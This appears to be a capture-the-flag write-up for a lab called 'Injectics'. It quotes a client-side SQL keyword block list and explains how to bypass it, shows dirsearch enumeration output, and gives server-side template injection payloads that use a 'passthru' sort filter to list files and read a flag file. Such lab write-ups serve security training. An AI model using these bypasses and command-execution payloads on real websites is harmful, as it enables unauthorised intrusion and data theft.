# Injectics

---

## Info Found in HomePage Source

### index.php

```html
<!-- Website developed by John Tim - dev@injectics.thm-->
<!-- Mails are stored in mail.log file-->
```

### script.js

```javascript
$("#login-form").on("submit", function(e) {
    e.preventDefault();
    var username = $("#email").val();
    var password = $("#pwd").val();

    const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
    for (let keyword of invalidKeywords) {
        if (username.includes(keyword)) {
            alert('Invalid keywords detected');
            return false;
        }
    }

    $.ajax({
        url: 'functions.php',
        type: 'POST',
        data: {
            username: username,
            password: password,
            function: "login"
        },
        dataType: 'json',
        success: function(data) {
            if (data.status == "success") {
                window.location = 'dashboard.php';
            } else {
                $("#messagess").html('<div class="alert alert-danger" role="alert">' + data.message + '</div>');
            }
        }
    });
});
```

The filter can be bypassed using obfuscation (e.g., `||` for `OR`) or targeting the unprotected password field. Since validation is client-side, it can be disabled or altered in the browser.

---

## dirsearch Example

```bash
dirsearch -u http://TARGET_IP
```

Example output:

```
[06:31:26] 200 -   48B  - /composer.json
[06:31:26] 200 -    9KB - /composer.lock
[06:31:29] 301 -  310B  - /css  ->  http://10.80.131.67/css/
[06:31:29] 302 -    0B  - /dashboard.php  ->  dashboard.php
```

---

## Exploiting SSTI

### Example Payloads

```jinja
{{4*4}}  # Returns 16
{{["ls",""]|sort('passthru')}}
{{["cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt",""]|sort('passthru')}}
```

---

## Appendix

---